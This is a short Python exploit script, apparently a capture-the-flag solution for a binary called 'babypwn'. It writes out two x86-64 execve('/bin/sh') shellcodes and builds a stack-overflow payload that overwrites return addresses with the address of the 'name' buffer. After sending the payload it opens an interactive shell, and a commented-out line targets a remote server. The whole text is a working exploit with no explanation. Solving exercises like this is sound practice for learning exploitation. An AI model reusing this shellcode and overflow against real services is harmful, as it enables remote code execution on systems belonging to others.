from ptrlib import *

elf = ELF("./babypwn")
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"

sock = Process("stdbuf -i 0 -o 0 ./babypwn".split())
#sock = Socket("stack.overflow.fail", 9000)

payload = b"+" * 0x90
payload += p64(elf.symbol('name')) * 8

sock.recvuntil("name?\n")
sock.sendline(shellcode)
sock.sendline("+")
sock.sendline("1")
sock.sendline(payload)

sock.interactive()
